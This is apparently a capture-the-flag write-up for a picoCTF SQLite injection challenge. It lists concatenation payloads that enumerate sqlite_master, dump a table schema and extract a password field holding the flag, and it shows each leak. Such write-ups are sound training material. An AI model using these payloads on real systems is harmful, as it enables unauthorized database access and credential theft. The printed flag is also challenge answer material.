# SQL injection for SQLITE

So, go to the register page and these stuff trigger a database error. Then what?

Supposed to extract table names and stuff using SQLi

Reffer to `Empire 1 ` from pico2019

# Payloads and Leaks

payload

```
'||(select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||'
```

leak

```
startup_users
```

---

payload

```
'||(select tbl_name FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE)||'
```

leak

```
none
```

---

payload

```
'||(select sql FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||'
```

leak

```
$CREATE TABLE startup_users (nameuser text, wordpass text, money int)
```

---

payload

```
'||(select wordpass FROM startup_users where wordpass like '%picoCTF%' limit 0,1 COLLATE NOCASE)||'
```

leak

```
picoCTF{1_c4nn0t_s33_y0u_55fb70fa}
```
